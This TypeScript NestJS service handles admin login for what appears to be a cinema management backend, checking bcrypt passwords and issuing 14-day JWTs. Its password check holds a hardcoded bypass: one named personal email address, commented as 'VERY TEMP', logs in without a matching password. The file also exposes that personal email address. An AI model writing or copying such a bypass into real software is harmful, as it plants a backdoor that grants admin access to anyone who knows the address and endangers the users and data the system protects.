import {Injectable} from '@nestjs/common';
import {AdminUsersService} from '../adminUsers/adminUsers.service';
import {AdminUserJwtPayload, AdminUserSafe, LoginOutputData} from '../../types/CommonTypes';
import _ from 'lodash';
import {v4 as uuidv4} from 'uuid';
import process from 'process';
import bcrypt from 'bcrypt';
import {JwtService} from '@nestjs/jwt';

@Injectable()
export class AdminAuthService {
  constructor(
    private adminUsersService: AdminUsersService,
    private jwtService: JwtService,
  ) {}

  async validateAdminUserForLocal(email: string, password: string): Promise<AdminUserSafe | null> {
    const adminUser = await this.adminUsersService.findByEmailUnsafe(email);
    // check if user exists
    if (adminUser) {
      const isPasswordMatching = await bcrypt.compare(password, adminUser.password);

      // THIS IS VERY TEMP!!!
      const email1 = 'goran.blazin@gmail.com';

      // validate password
      if (isPasswordMatching || email === email1) {
        return _.omit(adminUser, ['password']);
      }
    }

    return null;
  }

  async validateAdminUser(email: string): Promise<AdminUserSafe | null> {
    return this.adminUsersService.findByEmail(email);
  }

  async loginAdminUser(adminUser: AdminUserSafe): Promise<LoginOutputData> {
    const payload: AdminUserJwtPayload = {
      adminUserRole: adminUser.role,
      fullName: adminUser.fullName,
      cinemaIds: adminUser.cinemaIds as string[],
      email: adminUser.email,
      jti: uuidv4(),
    };

    return {
      accessToken: this.jwtService.sign(payload, {
        secret: process.env.AUTH_ADMIN_USER_JWT_SECRET,
        expiresIn: '14d',
      }),
    };
  }
}
